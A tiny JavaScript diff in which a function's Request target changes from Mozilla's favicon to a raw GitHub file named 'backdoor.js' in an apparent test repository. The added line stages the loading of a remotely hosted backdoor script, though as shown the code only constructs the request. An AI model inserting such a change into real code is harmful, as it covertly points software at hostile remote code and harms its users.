@@ -2,5 +2,5 @@
 
 function jsplol() {
     //actions
-    const request = new Request("https://www.mozilla.org/favicon.ico");
+    const request = new Request("https://raw.githubusercontent.com/ssjblue-xxx/terrible-backdoor-test/main/backdoor.js");
 }
